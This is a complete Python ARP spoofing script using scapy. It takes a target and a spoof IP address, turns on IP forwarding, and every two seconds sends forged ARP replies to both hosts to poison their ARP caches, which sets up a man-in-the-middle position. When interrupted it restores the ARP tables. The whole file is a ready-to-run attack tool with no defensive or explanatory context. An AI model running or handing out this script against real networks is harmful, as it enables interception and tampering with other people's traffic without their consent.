#!/usr/bin/env python3
import time
import argparse
import subprocess
import scapy.all as scapy


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--target",dest="target_ip",help="Target IP")
    parser.add_argument("-s","--spoof",dest="spoof_ip",help="Spoof IP")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error("Please specify target args ! see more info use -h or --help")
    elif not options.spoof_ip:
        parser.error("Please specify target args ! see more info use -h or --help")
    else:
        return options

def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet,verbose=False)

def get_mac(ip):
    ans = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip),timeout=2,verbose=False)[0]
    return ans[0][1].hwsrc

def restore(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip,hwsrc=spoof_mac)
    scapy.send(packet,count=4,verbose=False)

def main():
    options = get_args()
    target_ip = options.target_ip
    spoof_ip = options.spoof_ip
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward",shell=True)
    try:
        counter = 0
        while True:
            spoof(target_ip, spoof_ip)
            spoof(spoof_ip, target_ip)
            counter = counter + 2
            print("\rsend number:" + str(counter), end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("[+] CTRL+C ... Quitting. Restore ARP Table wait some seconds ...")
        restore(target_ip,spoof_ip)
        restore(spoof_ip, target_ip)

main()
